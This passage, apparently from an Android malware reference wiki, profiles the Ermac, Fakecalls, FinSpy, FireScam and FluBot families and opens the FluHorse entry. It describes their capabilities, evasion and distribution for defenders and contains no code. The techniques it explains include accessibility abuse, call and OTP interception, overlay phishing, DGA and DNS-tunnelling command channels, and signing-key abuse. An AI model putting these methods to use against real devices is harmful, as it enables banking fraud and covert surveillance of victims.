Launch specified application (triggers overlay) <code>getAccounts</code> Steal device accounts <code>getContacts</code> Exfiltrate contact list <code>getInstalledApps</code> Enumerate installed packages <code>push</code> Display push notification <code>clearCache</code> Clear target app data to force re-login <code>openURL</code> Open URL in browser"},{"location":"malware/families/ermac/#obfuscation","title":"Obfuscation","text":"<p>Ermac applies multiple obfuscation layers on top of the Cerberus base:</p> Technique Details Blowfish string encryption All sensitive strings encrypted, decrypted at runtime Class/method renaming Standard ProGuard-style obfuscation Packed payloads Some samples use additional packing layers Dynamic C2 resolution C2 addresses encrypted and resolved at runtime"},{"location":"malware/families/ermac/#accessibility-service","title":"Accessibility Service","text":"<p>Like its Cerberus ancestor, Ermac's entire operation hinges on the Android Accessibility Service. The malware uses a persistent screen urging the user to enable accessibility until they comply. Once enabled, the service:</p> <ul> <li>Monitors foreground application changes via <code>TYPE_WINDOW_STATE_CHANGED</code></li> <li>Auto-grants runtime permissions without user interaction</li> <li>Captures keystrokes across all applications</li> <li>Triggers overlays when target apps are detected</li> <li>Prevents uninstallation by intercepting settings navigation</li> </ul>"},{"location":"malware/families/ermac/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>Ermac's target list grew substantially between versions, with heavy concentration in European and North American banking:</p> Region Notable Targets Poland Primary initial target; campaigns impersonating Bolt Food, PKO Bank United States Major banks and financial apps Western Europe Spain, France, Italy, Germany, UK Eastern Europe Turkey, Czech Republic Australia Major banking institutions Cryptocurrency (global) MetaMask, Trust Wallet, Coinbase, Crypto.com, Binance <p>Cryptocurrency wallets became a significant focus in Ermac 2.0. The inject kits included dedicated phishing screens for seed phrase capture across major wallet applications, reflecting the broader trend of Android banking trojans expanding into crypto theft.</p>"},{"location":"malware/families/ermac/#notable-campaigns","title":"Notable Campaigns","text":"<p>August 2021: First Ermac campaigns identified by ThreatFabric targeting Poland with 378 banking app overlays. DukeEugene advertised rentals at $3,000/month.</p> <p>May 2022: Ermac 2.0 launched. Cyble documented campaigns using fake Bolt Food sites to deliver the updated trojan to Polish users. Target list expanded to 467 applications. Bleeping Computer reported the expanded targeting and $5,000/month rental price.</p> <p>Q2-Q3 2022: Intel 471 reported Ermac as the third most active Android banking trojan, with campaigns spanning multiple continents. Cyble tracked increasingly active distribution across Europe.</p> <p>January 2023: DukeEugene announced Hook, built on Ermac's codebase. Active Ermac campaigns began declining as operators migrated to the more capable successor.</p> <p>2024: Silent Push uncovered 24 active DukeEugene control panels administering services for Ermac, Hook, and related variants, demonstrating that Ermac infrastructure remained partially operational even after Hook's introduction.</p> <p>August 2025: The Ermac 3.0 source code leaked, exposing the full malware infrastructure including C2 panel code and builder tools, mirroring the original Cerberus leak that started the lineage.</p>"},{"location":"malware/families/fakecalls/","title":"Fakecalls","text":"<p>Fakecalls is a Korean banking trojan with voice phishing (vishing) capabilities that intercepts outgoing calls to real bank phone numbers and replaces them with attacker-controlled recorded conversations. Kaspersky published a detailed analysis documenting the call interception mechanism. McAfee later documented variants signed with a legitimate Android app signing key, enabling the malware to bypass signature-based detection and app verification checks. The family targets major South Korean banks exclusively and represents the most advanced integration of voice phishing with mobile malware.</p>"},{"location":"malware/families/fakecalls/#overview","title":"Overview","text":"Attribute Details First Seen 2022 Last Seen Active Status Active, ongoing Korean campaigns Type Banking trojan with vishing capability Attribution Unknown; Korean-language operations Aliases None known"},{"location":"malware/families/fakecalls/#vendor-names","title":"Vendor Names","text":"Vendor Name Kaspersky HEUR:Trojan-Banker.AndroidOS.Fakecalls McAfee Android/Fakecalls AhnLab Trojan/Android.FakeCalls ESET Android/Spy.Banker.Fakecalls"},{"location":"malware/families/fakecalls/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Fakecalls is independently developed with no known code lineage to other banking trojan families. Its primary innovation is the integration of voice call interception with mobile banking fraud, a capability not seen in other documented families. While Copybara uses human operators making real vishing calls (TOAD), Fakecalls automates the voice phishing by intercepting actual calls to banks and playing pre-recorded IVR (Interactive Voice Response) audio.</p>"},{"location":"malware/families/fakecalls/#distribution","title":"Distribution","text":"Vector Details Fake banking apps APKs impersonating KB Kookmin Bank, Shinhan Bank, Samsung Card, Hana Bank Third-party stores Korean third-party app repositories Smishing SMS lures directing users to fake banking app download pages <p>The fake apps closely replicate the look of legitimate Korean banking applications, using official logos, color schemes, and interface layouts.</p>"},{"location":"malware/families/fakecalls/#capabilities","title":"Capabilities","text":"Capability Description Call interception Intercepts outgoing calls to real bank numbers, replaces with recorded audio Call spoofing Displays the real bank's phone number on screen while the call is redirected Recorded IVR playback Plays pre-recorded Korean-language IVR menus mimicking bank customer service Live operator handoff Can connect victim to a live attacker posing as bank staff Overlay attacks Credential phishing overlays over banking apps SMS interception Reads and intercepts OTP codes Screen streaming Real-time screen capture sent to C2 Device info collection IMEI, phone number, installed apps, contacts GPS location Tracks victim location"},{"location":"malware/families/fakecalls/#call-interception-flow","title":"Call Interception Flow","text":"<p>The voice phishing attack chain:</p> <ol> <li>User dials their real bank's customer service number</li> <li>Fakecalls intercepts the outgoing call before it connects</li> <li>The call is redirected to the attacker's infrastructure</li> <li>The real bank's phone number continues to display on screen</li> <li>Pre-recorded IVR audio plays, mimicking the bank's automated menu</li> <li>Victim follows voice prompts, entering account numbers, PINs, card numbers</li> <li>Captured data transmitted to C2</li> <li>Optionally, a live Korean-speaking attacker takes over the call</li> </ol>"},{"location":"malware/families/fakecalls/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/fakecalls/#call-interception","title":"Call Interception","text":"<p>Fakecalls uses Android's call management APIs to intercept and redirect outgoing calls:</p> <ul> <li>Registers as a phone call handler through the dialer role</li> <li>Monitors outgoing calls for target bank phone numbers</li> <li>Blocks the actual call from connecting</li> <li>Plays pre-recorded audio through the in-call audio stream</li> <li>Displays a fake call UI showing the real bank number</li> </ul> <p>This requires CALL_PHONE, READ_PHONE_STATE, and ANSWER_PHONE_CALLS permissions.</p>"},{"location":"malware/families/fakecalls/#legitimate-signing-key-abuse","title":"Legitimate Signing Key Abuse","text":"<p>McAfee documented variants signed with a compromised legitimate Android app signing key:</p> <ul> <li>APK signed with a key associated with legitimate Korean apps</li> <li>Bypasses signature-based detection that trusts known signing certificates</li> <li>Passes some device-level app verification checks</li> <li>The key compromise may have occurred through developer account theft or insider access</li> </ul>"},{"location":"malware/families/fakecalls/#pre-recorded-audio","title":"Pre-Recorded Audio","text":"<p>The malware contains Korean-language audio files mimicking bank IVR systems:</p> Audio Content Welcome greeting \"Thank you for calling [Bank Name]\" Menu prompts \"Press 1 for account balance, press 2 for transfers...\" Information requests \"Please enter your account number followed by the pound key\" Hold music Standard hold music matching the impersonated bank Confirmation \"Your transaction is being processed, please hold\""},{"location":"malware/families/fakecalls/#target-regions","title":"Target Regions","text":"Region Details South Korea Exclusive target <p>Target banks include KB Kookmin Bank, Shinhan Bank, Samsung Card, Hana Bank, and other major Korean financial institutions. The Korean-language IVR recordings and specific bank impersonation limit operations to Korean-speaking victims.</p>"},{"location":"malware/families/fakecalls/#notable-campaigns","title":"Notable Campaigns","text":"<p>2022: Fakecalls first appears targeting Korean banking users with call interception capabilities. Kaspersky publishes analysis documenting the voice phishing mechanism, call spoofing, and pre-recorded IVR system.</p> <p>2023: McAfee discovers Fakecalls variants signed with a legitimate app signing key, revealing a new evasion technique. The compromised signing key allows the malware to bypass multiple layers of signature-based verification.</p>"},{"location":"malware/families/finspy/","title":"FinSpy","text":"<p>FinSpy (also sold as FinFisher) was a commercial surveillance suite developed by Munich-based FinFisher GmbH and marketed to law enforcement and intelligence agencies worldwide. Active from approximately 2012 through 2022, it stood out for its extraordinary obfuscation: multiple protection layers, a custom virtual machine, anti-analysis checks, and ISP-level delivery mechanisms. The company collapsed in 2022 after German prosecutors investigated the unauthorized export of surveillance software to Turkey. FinSpy's obfuscation complexity became a benchmark in the malware analysis community, with researchers from ESET, Kaspersky, and Amnesty International investing months to produce public analyses.</p>"},{"location":"malware/families/finspy/#overview","title":"Overview","text":"Attribute Details First Seen 2012 (mobile variants), earlier on desktop Last Seen 2022 (company bankruptcy) Status FinFisher GmbH dissolved, no new development expected Type Commercial spyware (law enforcement/intelligence) Attribution FinFisher GmbH (Munich, Germany), subsidiary of Gamma Group (UK) Aliases FinFisher, FinSpy Mobile, FinSpy PC, Wingbird (Microsoft) Platforms Android, iOS, Windows, macOS, Linux"},{"location":"malware/families/finspy/#origin-and-lineage","title":"Origin and Lineage","text":"<p>FinFisher GmbH operated as a subsidiary of Gamma Group International, a UK-based company. The product line included desktop and mobile implants marketed at trade shows like ISS World (the \"Wiretappers' Ball\") alongside a full suite of network injection tools for ISP-level deployment.</p> <p>Citizen Lab first documented FinFisher's mobile capabilities in August 2012 in their report \"The SmartPhone Who Loved Me,\" identifying FinSpy samples for Android, iOS, BlackBerry, Windows Mobile, and Symbian. A 2014 breach of Gamma Group's servers by the hacktivist \"Phineas Fisher\" leaked 40GB of internal data, including FinFisher source code, client lists, and pricing documents. The leak confirmed sales to governments with poor human rights records including Bahrain, Ethiopia, and Turkmenistan.</p> <p>Citizen Lab mapped FinFisher's proliferation across dozens of countries in their 2015 report \"Pay No Attention to the Server Behind the Proxy,\" identifying C2 servers in more countries than any previous scan despite the 2014 leak.</p> <p>In 2022, FinFisher GmbH filed for insolvency and was dissolved following a criminal investigation by the Munich Public Prosecutor's Office. The investigation, triggered by a criminal complaint from GFF, Reporters Without Borders, netzpolitik.org, and ECCHR, focused on the unauthorized export of surveillance software to Turkey. In May 2023, German prosecutors charged four former executives of the corporate group.</p>"},{"location":"malware/families/finspy/#distribution","title":"Distribution","text":"<p>FinFisher used multiple delivery mechanisms, with ISP-level injection being the most distinctive.</p> Vector Details ISP-level man-in-the-middle Network injection appliances deployed at ISPs intercept download requests and replace legitimate software with trojanized versions. ESET documented this in 2017, identifying ISP-level MITM in Turkey (Turk Telekom) and Egypt where downloads of legitimate software (Avast, CCleaner, Opera, 7-Zip, WinRAR) were silently replaced with FinSpy-bundled installers. Spear-phishing Emails with malicious attachments or links tailored to specific targets Physical access Direct installation when agents have physical possession of the device Trojanized apps APKs disguised as legitimate applications distributed through links or alternative app stores <p>The ISP-level injection is particularly relevant because it requires cooperation (willing or coerced) from the target's internet service provider, meaning the deploying government has domestic authority over telecommunications infrastructure.</p>"},{"location":"malware/families/finspy/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/finspy/#android-implant","title":"Android Implant","text":"<p>The Android variant provides comprehensive surveillance. Kaspersky documented updated iOS and Android implants in July 2019, noting activity in nearly 20 countries:</p> Capability Implementation Call recording Record voice calls, VoIP calls (Skype, WhatsApp, Viber, etc.) Messaging Intercept SMS, MMS, and messages from Signal, Telegram, WhatsApp, Threema, Facebook Messenger Camera Silent activation of front and rear cameras for photo and video Microphone Ambient audio recording, room monitoring Location GPS tracking, cell tower positioning Keylogging Capture keystrokes across all applications via accessibility Contacts and calendar Full exfiltration File access Browse and exfiltrate device storage Screen capture Periodic screenshots Root exploitation Abuse known vulnerabilities to gain root privileges"},{"location":"malware/families/finspy/#desktop-variants","title":"Desktop Variants","text":"<p>While this wiki focuses on Android, FinSpy's desktop capabilities are worth noting for context: Kaspersky's 2021 analysis revealed a UEFI bootkit that infects the Windows Boot Manager for persistence below the OS level, and Amnesty International documented Linux and macOS variants targeting Egyptian civil society organizations.</p>"},{"location":"malware/families/finspy/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/finspy/#obfuscation-the-defining-feature","title":"Obfuscation: The Defining Feature","text":"<p>FinSpy's obfuscation is what separates it from every other commercial spyware family. Multiple research teams have documented its layered protection:</p> <p>Four-layer obfuscation system (Kaspersky, 2021):</p> Layer Technique Layer 1 FinSpy Mutator: instruction-level code transformation Layer 2 OLLVM-style obfuscation: control flow flattening, bogus control flow, instruction substitution Layer 3 Custom virtual machine: bytecode interpreter that executes protected functions in a proprietary VM ISA Layer 4 Anti-analysis shellcodes: environment fingerprinting that terminates execution in sandboxes and VMs <p>Custom Virtual Machine (ESET, January 2018):</p> <p>ESET researcher Filip Kafka published \"ESET's guide to deobfuscating and devirtualizing FinFisher\", the definitive public reference for analyzing FinFisher's VM. The VM translates native x86 instructions into custom bytecode at build time. At runtime, a bytecode interpreter executes these instructions, meaning static analysis tools like IDA Pro see only the interpreter loop rather than the actual logic. ESET also released IDA Python scripts on GitHub to assist with devirtualization.</p>"},{"location":"malware/families/finspy/#android-specific-obfuscation","title":"Android-Specific Obfuscation","text":"<p>The Android variant uses its own protection scheme. Defensive Lab Agency analyzed FinSpy for Android (designated DexDen in their analysis), finding:</p> <ul> <li>Configuration data encrypted and hidden within the APK</li> <li>Heavy use of JNI (Java Native Interface) calls to move logic into native code where Dalvik-level analysis tools cannot follow</li> <li>Anti-emulator checks targeting common analysis environments</li> <li>String encryption with runtime decryption</li> </ul>"},{"location":"malware/families/finspy/#persistence","title":"Persistence","text":"<p>On Android, FinSpy registers as a device administrator and uses accessibility services to prevent removal. On rooted devices, it installs system-level components. The desktop variant achieves persistence through a UEFI bootkit (Kaspersky) that operates below the operating system, surviving OS reinstallation.</p>"},{"location":"malware/families/finspy/#c2-communication","title":"C2 Communication","text":"<p>FinSpy communicates with its C2 over HTTPS with custom encryption. Citizen Lab's scanning research identified that FinFisher uses anonymizing proxy servers to obscure the true location of master C2 servers, though their 2015 research devised techniques to unmask these proxies.</p>"},{"location":"malware/families/finspy/#known-deployments-and-targets","title":"Known Deployments and Targets","text":"<p>Citizen Lab's cumulative research identified FinFisher deployments or suspected use in over 30 countries:</p> Region Countries Middle East &amp; North Africa Bahrain, Egypt, Jordan, Lebanon, Morocco, Oman, Saudi Arabia, Turkey, UAE Sub-Saharan Africa Angola, Ethiopia, Gabon, Kenya, Nigeria, South Africa Europe Austria, Belgium, Czech Republic, Estonia, Germany, Hungary, Italy, Netherlands, Serbia, Slovenia, Spain Asia Bangladesh, Indonesia, Malaysia, Mongolia, Pakistan, Singapore, Vietnam Americas Mexico, Paraguay, Venezuela <p>Confirmed targets include Bahraini activists and dissidents, Ethiopian opposition journalists, Turkish political targets (the export that triggered the criminal investigation), and Egyptian civil society organizations.</p>"},{"location":"malware/families/finspy/#notable-campaigns-and-discoveries","title":"Notable Campaigns and Discoveries","text":"<p>August 2012: Citizen Lab publishes \"The SmartPhone Who Loved Me\", the first documentation of FinFisher mobile implants across Android, iOS, BlackBerry, Windows Mobile, and Symbian.</p> <p>August 2014: The hacktivist \"Phineas Fisher\" breaches Gamma Group servers, leaking 40GB of FinFisher data including source code, client lists, and deployment documentation. The leak confirms sales to governments in Bahrain, Ethiopia, and Turkmenistan.</p> <p>October 2015: Citizen Lab publishes \"Pay No Attention to the Server Behind the Proxy\", mapping FinFisher to operations in 32+ countries despite the 2014 breach.</p> <p>September 2017: ESET documents ISP-level MITM campaigns in Turkey and Egypt, where downloads of legitimate software were intercepted and replaced with FinSpy-bundled versions at the ISP level.</p> <p>January 2018: ESET publishes their whitepaper on deobfuscating and devirtualizing FinFisher, providing the first public methodology for defeating FinFisher's custom VM protection.</p> <p>July 2019: Kaspersky discovers updated FinSpy mobile implants active in nearly 20 countries, including new features and improved obfuscation for both iOS and Android.</p> <p>September 2020: Amnesty International and Defensive Lab Agency document new FinSpy variants targeting Egyptian civil society, including previously unknown Linux and macOS versions.</p> <p>September 2021: Kaspersky publishes \"FinSpy: unseen findings\", revealing the four-layer obfuscation system, the UEFI bootkit, and advanced anti-analysis measures. This represents the most comprehensive technical teardown of FinFisher's protection layers.</p> <p>March 2022: FinFisher GmbH files for insolvency and is dissolved after German authorities seize company accounts. The Chaos Computer Club declares a \"stage win\" against the surveillance industry.</p> <p>May 2023: Munich prosecutors charge four former FinFisher executives for illegally exporting surveillance software to Turkey without the required export license.</p>"},{"location":"malware/families/firescam/","title":"FireScam","text":"<p>FireScam is an Android information stealer discovered by CYFIRMA in January 2025 that masquerades as a Telegram Premium application. The malware is distributed through a phishing page impersonating RuStore, Russia's domestic app store launched after Western sanctions led to the removal of major apps from the Russian Google Play Store. FireScam leverages Google Firebase for both C2 configuration delivery and real-time data exfiltration, using Firebase's real-time database as a staging area for stolen data. The malware intercepts notifications across all applications, captures clipboard contents, monitors e-commerce transactions, and exfiltrates credentials, messaging data, and device information. Its targeting of Russian-speaking users through a fake RuStore page positions it as a threat specifically calibrated for the post-sanctions Russian mobile ecosystem.</p>"},{"location":"malware/families/firescam/#overview","title":"Overview","text":"Attribute Details First Seen January 2025 Status Active Type Information stealer, spyware Aliases None known Attribution Unknown Distribution Fake RuStore phishing page, Telegram Premium lure"},{"location":"malware/families/firescam/#origin-and-lineage","title":"Origin and Lineage","text":"<p>CYFIRMA published their analysis in January 2025, documenting FireScam as a newly discovered Android threat with no known lineage to existing malware families. The choice of RuStore as a distribution vector and Telegram Premium as the lure application suggests an operator with specific knowledge of the Russian mobile ecosystem and user behavior patterns.</p> <p>RuStore was launched in 2022 by Russian internet company VK (formerly Mail.ru Group) as an alternative app store after Google restricted access to Google Play for Russian users and many Western app developers withdrew from the Russian market. Russian users who adopted RuStore are accustomed to sideloading apps from alternative sources, making them more susceptible to phishing pages that replicate the RuStore interface. The Telegram Premium lure exploits the platform's massive popularity in Russia, where Telegram serves as a primary communication channel for both personal and business use.</p>"},{"location":"malware/families/firescam/#distribution","title":"Distribution","text":"Vector Details Fake RuStore page Phishing website replicating Russia's RuStore app marketplace Telegram Premium lure Malware disguised as the premium version of Telegram"},{"location":"malware/families/firescam/#attack-flow","title":"Attack Flow","text":"<ol> <li>The victim visits a phishing page designed to look like the RuStore app store</li> <li>The page presents a fake \"Telegram Premium\" application for download</li> <li>The victim downloads and installs a dropper APK from the phishing page</li> <li>The dropper requests storage and package installation permissions</li> <li>The dropper extracts and installs the main FireScam payload</li> <li>FireScam requests extensive permissions including notification access, clipboard monitoring, and SMS access</li> <li>A fake Telegram login screen captures the victim's credentials</li> <li>FireScam establishes communication with Firebase infrastructure for C2 and data exfiltration</li> </ol>"},{"location":"malware/families/firescam/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/firescam/#core-features","title":"Core Features","text":"Capability Implementation Notification interception Monitors and captures notifications from all applications on the device Clipboard monitoring Continuously captures clipboard contents, including copied passwords and tokens E-commerce monitoring Tracks e-commerce transactions and captures financial data from shopping apps Credential theft Fake Telegram login screen harvests credentials at install time SMS collection Reads and exfiltrates text messages Contact exfiltration Harvests the device contact list Call log harvesting Extracts call history Device profiling Collects device model, OS version, storage information, and installed apps"},{"location":"malware/families/firescam/#notification-interception","title":"Notification Interception","text":"<p>FireScam's notification interception captures data from every application on the device. This includes messaging apps, email clients, banking apps, and authentication tools. By reading notification content, the malware can harvest one-time passwords (OTPs), two-factor authentication codes, message previews, and transaction alerts without needing to directly compromise each individual application.</p>"},{"location":"malware/families/firescam/#e-commerce-monitoring","title":"E-Commerce Monitoring","text":"<p>FireScam specifically monitors e-commerce application activity, capturing transaction details, payment information, and purchase history. This targeted capability suggests the operators are interested in financial data beyond what traditional banking trojans collect through overlay attacks, focusing instead on the broader spectrum of digital commerce activity.</p>"},{"location":"malware/families/firescam/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/firescam/#firebase-infrastructure","title":"Firebase Infrastructure","text":"<p>FireScam's most distinctive technical characteristic is its reliance on Google Firebase as core infrastructure. The malware uses Firebase in two roles:</p> Firebase Function Purpose C2 configuration Delivers operational parameters and commands to the implant Real-time database Serves as a staging area for exfiltrated data before operator retrieval <p>Using Firebase provides several operational advantages. Firebase traffic is directed to Google-owned domains, making it indistinguishable from legitimate app traffic at the network level. Firebase's real-time database functionality allows the malware to continuously stream stolen data without maintaining a dedicated C2 server. This reduces the infrastructure footprint the operator must manage and eliminates a traditional indicator of compromise (a suspicious C2 domain).</p> <p>This Firebase-centric approach shares architectural similarities with KoSpy, which uses Firebase Firestore for C2 configuration delivery. However, FireScam takes the Firebase dependency further by also using the real-time database for data exfiltration, whereas KoSpy switches to a dedicated C2 server for ongoing communication and data collection.</p>"},{"location":"malware/families/firescam/#dropper-mechanism","title":"Dropper Mechanism","text":"<p>FireScam uses a two-stage installation process. The initial APK downloaded from the fake RuStore page functions as a dropper that extracts and installs the main payload. This separation allows the dropper to appear relatively benign during initial analysis, with the bulk of malicious functionality contained in the second-stage payload.</p>"},{"location":"malware/families/firescam/#target-regions","title":"Target Regions","text":"Region Details Russia Primary target: Russian-speaking users who use RuStore and Telegram <p>The fake RuStore distribution page, Telegram Premium lure, and Russian-language interface collectively confirm that FireScam is designed specifically for Russian-speaking victims. The post-sanctions Russian mobile ecosystem, where sideloading from alternative stores has become normalized, creates an environment where users are more likely to download apps from unfamiliar sources.</p>"},{"location":"malware/families/firescam/#notable-campaigns","title":"Notable Campaigns","text":"<p>January 2025: CYFIRMA disclosed FireScam after discovering the phishing page impersonating RuStore and distributing a fake Telegram Premium application. The analysis documented the Firebase-based C2 and exfiltration architecture, notification interception capabilities, and e-commerce monitoring. The campaign specifically targets Russian-speaking users navigating the alternative app store ecosystem that emerged after Western sanctions.</p>"},{"location":"malware/families/firescam/#related-families","title":"Related Families","text":"Family Relationship KoSpy Both use Google Firebase infrastructure for C2 configuration delivery, leveraging legitimate Google services to blend malicious traffic with normal app behavior. KoSpy uses Firebase Firestore for configuration and a separate C2 for data collection, while FireScam uses Firebase for both configuration and data exfiltration. SpyNote Both are Android surveillance tools that intercept notifications, capture credentials, and exfiltrate device data. SpyNote operates as a commodity RAT builder with a broad operator base, while FireScam is a focused information stealer targeting the Russian mobile ecosystem through a specific distribution chain."},{"location":"malware/families/flubot/","title":"FluBot","text":"<p>FluBot was an SMS-spreading Android banking trojan that achieved worm-like propagation by sending smishing messages to every contact on an infected device. Between late 2020 and mid-2022, it became one of the fastest-spreading mobile threats in history, harvesting over 11 million phone numbers in Spain alone (roughly 25% of the population). Dutch police seized its infrastructure in May 2022 as part of an Europol-coordinated operation involving 11 countries.</p>"},{"location":"malware/families/flubot/#overview","title":"Overview","text":"Attribute Details First Seen Late 2020 Last Seen June 2022 (infrastructure seized) Type Banking trojan, SMS worm, credential stealer Attribution Unknown, infrastructure operated from the Netherlands Aliases Cabassous, FedEx Banker"},{"location":"malware/families/flubot/#origin-and-lineage","title":"Origin and Lineage","text":"<p>FluBot first appeared targeting Spanish banking customers in late 2020. PRODAFT published the first major technical analysis after gaining visibility into the operation, revealing the scale of the botnet: approximately 60,000 active infected devices with access to harvested phone numbers from millions of contacts. The malware has no known direct code lineage to earlier banking trojan families, appearing as an independently developed project that drew on established techniques (overlay attacks, accessibility abuse) combined with a novel SMS worm propagation mechanism.</p> <p>FluBot's rapid spread and operational success attracted imitators. Both Medusa and Anatsa were observed using FluBot's distribution network and mimicking its smishing templates, as documented by Proofpoint and ThreatFabric.</p>"},{"location":"malware/families/flubot/#distribution","title":"Distribution","text":"<p>FluBot distributed exclusively through SMS phishing (smishing). The infection chain:</p> <pre><code>Victim receives SMS: \"Your package is arriving, track here: [link]\"\n    \u2192 Link leads to fake delivery tracking page (DHL, FedEx, Correos, UPS)\n    \u2192 Page prompts to download \"tracking app\" APK\n    \u2192 APK requests Accessibility Service permission on install\n    \u2192 Once granted: overlay attacks enabled, SMS access gained\n    \u2192 Malware reads victim's contact list\n    \u2192 Sends smishing SMS to all contacts from victim's device\n    \u2192 Cycle repeats on each new infection\n</code></pre> <p>The self-propagating SMS mechanism was the key differentiator. Each infected device became a distribution node, creating exponential growth. Proofpoint estimated tens of thousands of malicious SMS messages sent per hour during peak campaigns, with some subscribers receiving up to six FluBot SMS messages.</p>"},{"location":"malware/families/flubot/#lure-themes-by-region","title":"Lure Themes by Region","text":"Region Lure Theme Spain Correos (postal service), MRW delivery Germany DHL package tracking UK Royal Mail, DHL Italy Poste Italiane Australia Australia Post Japan Yamato Transport <p>After police action against the Spain-focused campaign in early 2021, operators pivoted to new regions rapidly, adapting lure templates to local postal services.</p>"},{"location":"malware/families/flubot/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/flubot/#core-functions","title":"Core Functions","text":"Capability Description SMS worm Reads contact list, sends smishing SMS from victim's device to all contacts Overlay attacks Injects phishing pages over banking and cryptocurrency apps to steal credentials SMS interception Reads, intercepts, and hides incoming SMS (steals OTPs) Contact exfiltration Uploads full contact list to C2 Notification interception Monitors push notifications for 2FA codes Keylogging Records keystrokes on targeted apps Remote control Operators can send commands for USSD execution, app installation, SMS sending Uninstall prevention Uses Accessibility Service to close settings/uninstall dialogs"},{"location":"malware/families/flubot/#version-evolution","title":"Version Evolution","text":"<p>FluBot iterated rapidly across versions. Fox-IT / NCC Group published a detailed version history and F5 Labs covered the v5.0 changes:</p> Version Date Changes 1.0-2.x Late 2020 Initial Spain campaign, basic overlay attacks, SMS worm 3.4 Early 2021 Reduced DGA domain count from 5,000 to 2,500 per month 3.7 March 2021 Replaced <code>.com</code> TLD in DGA with <code>.su</code> 3.9 March 2021 Introduced DNS-over-HTTPS (DoH) for DGA domain resolution 4.0 April 2021 Switched DoH provider from Cloudflare to Google 4.1 2021 Added multiple DoH providers: Google, Cloudflare, AliDNS 4.9 Late 2021 Direct HTTPS communication on port 443 after DGA resolution; expanded targeting to Australia, Japan 5.0 Early 2022 Replaced DGA+DoH with DNS tunneling over HTTPS; expanded to 30 TLDs; added remote seed change command"},{"location":"malware/families/flubot/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/flubot/#domain-generation-algorithm-dga","title":"Domain Generation Algorithm (DGA)","text":"<p>FluBot's DGA was central to its resilience. The algorithm generated domains based on a seed derived from the current year and month. NCSC-NL tracked FluBot DGA domains and F-Secure (now WithSecure) analyzed the DoH tunneling mechanism:</p> Parameter Details Seed Derived from current month and year Domain count 5,000 initially, reduced to 2,500 in v3.4, expanded again in v5.0 Domain length 15 characters TLDs (pre-v5) <code>.ru</code>, <code>.su</code>, <code>.cn</code> TLDs (v5.0+) 30 different TLDs Resolution DNS-over-HTTPS (v3.9+), then DNS tunneling over HTTPS (v5.0+)"},{"location":"malware/families/flubot/#c2-communication","title":"C2 Communication","text":"Version Method v1-v3.8 Standard DNS resolution of DGA domains, then HTTPS to resolved IP v3.9-v4.x DGA domains resolved via DNS-over-HTTPS (Cloudflare, Google, AliDNS), then HTTPS to resolved IP v5.0+ DNS tunneling: C2 data encoded in DNS queries sent via DoH providers; responses embedded in DNS replies <p>The DNS tunneling in v5.0 was a significant evolution. Instead of resolving DGA domains to get a C2 IP and then communicating over HTTPS, the malware embedded C2 commands and data directly within DNS queries and responses, using DoH providers as unwitting relays. This made traffic analysis substantially harder since all visible traffic appeared to be DNS queries to legitimate providers.</p>"},{"location":"malware/families/flubot/#encryption","title":"Encryption","text":"<ul> <li>C2 traffic encrypted with RSA public key embedded in the APK</li> <li>Payload APK encrypted within the dropper</li> <li>SMS message templates received from C2 in encrypted form</li> </ul>"},{"location":"malware/families/flubot/#overlay-injection","title":"Overlay Injection","text":"<p>FluBot targeted banking and cryptocurrency apps with HTML-based overlay pages loaded in WebViews. The inject list was received from C2 and matched against installed packages on the device. When a target app was foregrounded (detected via Accessibility Service), the corresponding phishing overlay was displayed.</p>"},{"location":"malware/families/flubot/#target-regions","title":"Target Regions","text":"<p>FluBot expanded geographically across its lifespan:</p> Phase Period Regions Initial Late 2020 - Early 2021 Spain European expansion Q1-Q2 2021 Germany, Italy, UK, Hungary, Poland, Finland, Sweden Global expansion Q3 2021 - 2022 Australia, New Zealand, Japan Late stage Early 2022 Additional European countries, attempted US expansion <p>BSI/CERT-Bund published advisories during the German campaign, and INCIBE-CERT (Spain) published a full analysis study documenting the original Spanish operations.</p>"},{"location":"malware/families/flubot/#notable-campaigns","title":"Notable Campaigns","text":"<p>2020, December: FluBot first appears targeting Spanish banking users through Correos (Spanish postal service) smishing lures. PRODAFT gains access to the operation and estimates 60,000 infected devices with 11 million harvested phone numbers from Spain.</p> <p>2021, March: Spanish police arrest four suspects linked to FluBot distribution. The operation pauses briefly, then resumes with expanded targeting. FluBot begins hitting Germany, Italy, and the UK.</p> <p>2021, April: Proofpoint publishes analysis warning that FluBot is spreading rapidly through Europe and may reach the US. Reports approximately 7,000 active UK infections with SMS volumes in the tens of thousands per hour.</p> <p>2021, June: BlackBerry publishes a technical breakdown of FluBot's overlay and SMS mechanisms. Multiple European CERTs issue public warnings.</p> <p>2021, Q4: FluBot v4.9 expands to Australia, New Zealand, and Japan with localized lure templates. Cyble documents the v4.9 New Zealand campaign.</p> <p>2022, Early: FluBot v5.0 deploys DNS tunneling over HTTPS, as analyzed by F-Secure and F5 Labs.</p> <p>2022, May: Dutch police seize FluBot infrastructure in an operation coordinated by Europol's European Cybercrime Centre (EC3). 11 countries participated: Australia, Belgium, Finland, Hungary, Ireland, Spain, Sweden, Switzerland, the Netherlands, and the United States. Police disconnected 10,000 victims from the botnet during the raid.</p> <p>2022, June: Fox-IT / NCC Group publishes a retrospective covering the full version history from initial discovery through takedown. No FluBot activity has been observed since the infrastructure seizure.</p>"},{"location":"malware/families/flubot/#related-families","title":"Related Families","text":"<p>Other major smishing-distributed families include MoqHao (Roaming Mantis), which uses similar SMS-based distribution targeting East Asian users and predates FluBot by two years. MoqHao's 2024 variants achieved auto-execution without user interaction, an evolution FluBot never reached before its takedown.</p>"},{"location":"malware/families/fluhorse/","title":"FluHorse","text":"<p>FluHorse is a Flutter-based Android credential stealer targeting East Asian users, first documented by Check Point Research in May 2023. What distinguishes FluHorse from other Android malware is its use of the Flutter framework (Dart language) for implementing malicious functionality. Because Flutter compiles Dart code into a native shared library (<code>libapp.so</code>) that runs inside a custom virtual machine, traditional Android reverse engineering tools cannot decompile or analyze the business logic through standard Dalvik/Java approaches. FluHorse impersonates popular toll-collection and banking apps in Taiwan and Vietnam, harvesting credentials, credit card data, and intercepted 2FA codes via SMS. Activity traces back to at least May 2022, with campaigns 